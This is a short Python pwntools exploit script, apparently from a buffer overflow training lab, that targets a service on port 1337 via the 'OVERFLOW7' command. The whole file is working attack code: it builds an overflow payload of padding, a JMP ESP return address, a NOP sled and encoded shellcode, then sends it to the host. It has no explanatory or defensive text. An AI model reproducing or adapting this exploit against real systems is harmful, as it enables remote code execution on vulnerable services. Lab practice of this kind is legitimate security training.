#!/usr/bin/env python3
from pwn import *

host = "192.168.1.27"
port = 1337
cmd = b"OVERFLOW7 " # cmd to run can be found after spiking
jmp_esp = 0x625011af   # jump point !mona jmp -r esp -cpb "\x00"
buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\xfd\xd1\xd4\xb7\x83\xee\xfc\xe2\xf4\x01\x39"
buf += b"\x56\xb7\xfd\xd1\xb4\x3e\x18\xe0\x14\xd3\x76\x81\xe4"
buf += b"\x3c\xaf\xdd\x5f\xe5\xe9\x5a\xa6\x9f\xf2\x66\x9e\x91"
buf += b"\xcc\x2e\x78\x8b\x9c\xad\xd6\x9b\xdd\x10\x1b\xba\xfc"
buf += b"\x16\x36\x45\xaf\x86\x5f\xe5\xed\x5a\x9e\x8b\x76\x9d"
buf += b"\xc5\xcf\x1e\x99\xd5\x66\xac\x5a\x8d\x97\xfc\x02\x5f"
buf += b"\xfe\xe5\x32\xee\xfe\x76\xe5\x5f\xb6\x2b\xe0\x2b\x1b"
buf += b"\x3c\x1e\xd9\xb6\x3a\xe9\x34\xc2\x0b\xd2\xa9\x4f\xc6"
buf += b"\xac\xf0\xc2\x19\x89\x5f\xef\xd9\xd0\x07\xd1\x76\xdd"
buf += b"\x9f\x3c\xa5\xcd\xd5\x64\x76\xd5\x5f\xb6\x2d\x58\x90"
buf += b"\x93\xd9\x8a\x8f\xd6\xa4\x8b\x85\x48\x1d\x8e\x8b\xed"
buf += b"\x76\xc3\x3f\x3a\xa0\xb9\xe7\x85\xfd\xd1\xbc\xc0\x8e"
buf += b"\xe3\x8b\xe3\x95\x9d\xa3\x91\xfa\x2e\x01\x0f\x6d\xd0"
buf += b"\xd4\xb7\xd4\x15\x80\xe7\x95\xf8\x54\xdc\xfd\x2e\x01"
buf += b"\xe7\xad\x81\x84\xf7\xad\x91\x84\xdf\x17\xde\x0b\x57"
buf += b"\x02\x04\x43\xdd\xf8\xb9\x14\x1f\xfc\xc7\xbc\xb5\xfd"
buf += b"\xc0\x88\x3e\x1b\xbb\xc4\xe1\xaa\xb9\x4d\x12\x89\xb0"
buf += b"\x2b\x62\x78\x11\xa0\xbb\x02\x9f\xdc\xc2\x11\xb9\x24"
buf += b"\x02\x5f\x87\x2b\x62\x95\xb2\xb9\xd3\xfd\x58\x37\xe0"
buf += b"\xaa\x86\xe5\x41\x97\xc3\x8d\xe1\x1f\x2c\xb2\x70\xb9"
buf += b"\xf5\xe8\xb6\xfc\x5c\x90\x93\xed\x17\xd4\xf3\xa9\x81"
buf += b"\x82\xe1\xab\x97\x82\xf9\xab\x87\x87\xe1\x95\xa8\x18"
buf += b"\x88\x7b\x2e\x01\x3e\x1d\x9f\x82\xf1\x02\xe1\xbc\xbf"
buf += b"\x7a\xcc\xb4\x48\x28\x6a\x34\xaa\xd7\xdb\xbc\x11\x68"
buf += b"\x6c\x49\x48\x28\xed\xd2\xcb\xf7\x51\x2f\x57\x88\xd4"
buf += b"\x6f\xf0\xee\xa3\xbb\xdd\xfd\x82\x2b\x62"
shellcode = buf
padding = b"A"*1306 #output of msf-pattern-offset

payload = cmd
payload += padding
payload += p32(jmp_esp)
payload += b"\x90"*16
payload += shellcode

p = remote(host, port)
p.sendline(payload)